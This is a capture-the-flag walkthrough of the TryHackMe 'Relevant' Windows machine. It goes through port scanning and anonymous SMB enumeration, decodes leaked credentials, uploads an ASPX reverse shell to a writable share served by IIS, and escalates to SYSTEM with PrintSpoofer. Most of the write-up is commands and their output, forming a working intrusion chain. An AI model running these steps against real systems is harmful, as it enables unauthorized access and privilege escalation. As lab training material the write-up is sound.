#  [Relevant](https://tryhackme.com/room/relevant)

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Relevant |
| Difficulty | Medium |
| Tags | security, security misconfiguration, accessible, pentest |


This machine is intermediate boot2root machine


```bash
export IP=10.10.45.100
```

---

```bash
nmap -vvv -sC -sV -A -v -oN nmap/initial.nmap 10.10.45.100
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 12:39 IST
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 12:41 (0:00:30 remaining)
Nmap scan report for 10.10.45.100
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE        VERSION
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-19T07:11:43+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I also did a all port scan and found Microsoft IIS Server running.

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-19T07:19:15+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-09-19T07:19:56+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

Got a list of shares.

```
smbclient -N -L \\\\10.10.45.100\\
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

So I was able to get access to the nt4wrksv

```
smbclient //10.10.45.100/nt4wrksv
```

```
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

                7735807 blocks of size 4096. 4949096 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

As this is base 64 so I decoded it and found this.

```
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d > credentials.txt
```

```
cat credentials.txt 
```
```
Bob - ######
Bill - ######4n420696969!$$$
```

Nice atleast we got something related to credentials.

```
nmap --script smb-vuln* -p 445 $IP
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 13:18 IST
Nmap scan report for 10.10.45.100
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```

SO the server is vulnerable to `ms17-010` i.e `Ethernal blue`.

I got stuck what to do So searched for SMB exploit and still not even manual eternal blue exploit worked.

So I found out that the `nt4wrksv` share is accessible and also we can put certain files.

There is windows server running on port 49663 and it contains this share `nt4wrksv/`

```
smbclient //10.10.177.188/nt4wrksv
```

```
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> put test.txt 
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Sep 19 14:22:23 2020
  ..                                  D        0  Sat Sep 19 14:22:23 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  test.txt                            A       18  Sat Sep 19 14:22:24 2020

                7735807 blocks of size 4096. 4946765 blocks available
smb: \> 


http://10.10.177.188:49663/nt4wrksv/test.txt
Hello its working
```

So we can upload reverse shell into this but IIS Server allows aspx files.

I got this shell from github (Change the IP and Port in the script)

```
smb: \> rm shell.aspx
smb: \> put new.aspx
putting file new.aspx as \new.aspx (15.2 kb/s) (average 15.2 kb/s)
smb: \> ls
  .                                   D        0  Sat Sep 19 14:45:12 2020
  ..                                  D        0  Sat Sep 19 14:45:12 2020
  new.aspx                            A    15969  Sat Sep 19 14:45:13 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

                7735807 blocks of size 4096. 4945302 blocks available
smb: \> 
```

Fire up netcat listener on port 1234 and see if we can get reverse shell.

```
nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.177.188 49885
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Finally got it
```
c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,217,888,768 bytes free

c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{#####################}
c:\Users\Bob\Desktop>
```
I got to know about the PrintSpoofer from walkthrough as I am not very familiar with windows privilege escalation.
So saw The mayor's walkthrough for privilege escalation.

https://www.cybergoat.co.uk/writeup/Relevant-TryHackMe/

https://github.com/itm4n/PrintSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

Here are the articles that might help you understand about the escalation.
```
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (22.3 kb/s) (average 19.0 kb/s)
smb: \> pwd
Current directory is \\10.10.177.188\nt4wrksv\
smb: \> 
```


```
 Directory of c:\inetpub\wwwroot\nt4wrksv

09/19/2020  02:29 AM    <DIR>          .
09/19/2020  02:29 AM    <DIR>          ..
09/19/2020  02:15 AM            15,969 new.aspx
07/25/2020  08:15 AM                98 passwords.txt
09/19/2020  02:29 AM            27,136 PrintSpoofer.exe
               3 File(s)         43,203 bytes
               2 Dir(s)  21,055,516,672 bytes free

c:\inetpub\wwwroot\nt4wrksv>

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.


PS C:\Windows\system32> whoami

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>


PS C:\Users\Administrator\Desktop> type root.txt
cat root.txt
THM{##############################}
PS C:\Users\Administrator\Desktop> 
```
